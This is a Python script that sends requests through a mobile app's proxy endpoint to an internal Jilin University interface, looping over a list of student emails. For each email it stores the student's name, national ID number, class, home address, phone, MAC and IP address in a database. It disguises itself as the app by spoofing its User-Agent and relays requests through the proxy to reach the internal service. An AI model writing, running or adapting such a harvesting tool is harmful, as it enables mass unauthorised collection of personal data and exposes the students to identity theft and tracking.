import requests
import json
import pymysql.cursors
import time
connect_data = open("/home/db.txt")
data = connect_data.read().split('\n')
connections = pymysql.connect(host=data[0], user=data[1], password=data[2], database='studentip', charset=data[4])
print('read')
with connections.cursor() as cursor:
    cursor.execute('select mail from valid;')
    mails = cursor.fetchall()
    mails = set([mail[0] for mail in mails])
    connections.commit()
print('finished')
while True:
    flag = 0
    try:
        while flag<1000:
            flag +=1
            mail = mails.pop()
            session = requests.Session()
            info_url = 'http://202.98.18.57:18080/webservice/m/api/proxy'
            postdata = 'link=http%3A%2F%2Fip.jlu.edu.cn%2Fpay%2Finterface_mobile.php%3Fmenu%3Dget_mail_info%26mail%3D' \
                       + mail
            postdata = postdata.encode()
            headers = {
                'Cookie': 'JSESSIONID=' + '',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': 'mjida/2.41 CFNetwork/808.2.16 Darwin/16.3.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            result = session.post(info_url, postdata, headers=headers).content.decode()
            result = json.loads(result)
            stu_info = result['resultValue']['content']
            stu_info = json.loads(stu_info)
            ip = stu_info.get('ip', [''])[0]
            print(mail, ip)
            ip_info = stu_info.get('ip_info', {}).get(ip, {})
            infos = [
                stu_info.get('mail', mail),
                ip,
                stu_info.get('name', ' '),
                stu_info.get('zhengjianhaoma', ' '),
                stu_info.get('class', ''),
                ip_info.get('id_name', ' '),
                ip_info.get('campus', ' '),
                ip_info.get('net_area', ' '),
                ip_info.get('home_addr', ' '),
                ip_info.get('phone', ' '),
                ip_info.get('mac', ' ')
            ]
            with connections.cursor() as cursor:
                cursor.execute('insert into valid values(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);', infos)
                connections.commit()
    except Exception as e:
        print(e)
        mails.add(mail)

